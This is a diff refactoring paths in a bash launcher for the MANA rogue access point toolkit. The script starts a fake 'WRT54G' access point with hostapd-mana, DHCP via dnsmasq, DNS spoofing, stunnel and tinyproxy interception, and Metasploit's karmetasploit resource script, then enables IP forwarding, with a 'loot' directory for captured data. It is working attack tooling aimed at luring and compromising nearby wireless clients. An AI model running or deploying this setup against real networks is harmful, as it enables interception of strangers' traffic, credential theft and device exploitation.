@@ -1,10 +1,14 @@
 #!/bin/bash
+etc=/etc/mana-toolkit
+lib=/usr/lib/mana-toolkit
+loot=/var/lib/mana-toolkit
+share=/usr/share/mana-toolkit
 
 phy=wlan0
 phy0="wlan0_0"
-conf=/etc/mana-toolkit/hostapd-mana-all.conf
-hostapd=/usr/lib/mana-toolkit/hostapd
-crackapd=/usr/share/mana-toolkit/crackapd/crackapd.py
+conf=$etc/hostapd-mana-all.conf
+hostapd=$lib/hostapd
+crackapd=$share/crackapd/crackapd.py
 
 hostname WRT54G
 echo hostname WRT54G
@@ -22,7 +26,7 @@ rfkill unblock wlan
 # Start hostapd
 sed -i "s/^interface=.*$/interface=$phy/" $conf
 sed -i "s/^bss=.*$/bss=$phy0/" $conf
-sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" /etc/mana-toolkit/karmetasploit.rc
+sed -i "s/^set INTERFACE .*$/set INTERFACE $phy/" $etc/karmetasploit.rc
 $hostapd $conf&
 sleep 5
 ifconfig $phy
@@ -32,14 +36,14 @@ route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
 ifconfig $phy0 10.1.0.1 netmask 255.255.255.0
 route add -net 10.1.0.0 netmask 255.255.255.0 gw 10.1.0.1
 
-dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd.conf -i $phy -I lo
-dnsmasq -z -C /etc/mana-toolkit/dnsmasq-dhcpd-two.conf -i $phy0 -I lo
-dnsspoof -i $phy -f /etc/mana-toolkit/dnsspoof.conf&
-dnsspoof -i $phy0 -f /etc/mana-toolkit/dnsspoof.conf&
+dnsmasq -z -C $etc/dnsmasq-dhcpd.conf -i $phy -I lo
+dnsmasq -z -C $etc/dnsmasq-dhcpd-two.conf -i $phy0 -I lo
+dnsspoof -i $phy -f $etc/dnsspoof.conf&
+dnsspoof -i $phy0 -f $etc/dnsspoof.conf&
 service apache2 start
-stunnel4 /etc/mana-toolkit/stunnel.conf
-tinyproxy -c /etc/mana-toolkit/tinyproxy.conf&
-msfconsole -r /etc/mana-toolkit/karmetasploit.rc& #Remove "&" to fix msfconsole exiting
+stunnel4 $etc/stunnel.conf
+tinyproxy -c $etc/tinyproxy.conf&
+msfconsole -r $etc/karmetasploit.rc& #Remove "&" to fix msfconsole exiting
 
 echo '1' > /proc/sys/net/ipv4/ip_forward
 iptables --policy INPUT ACCEPT
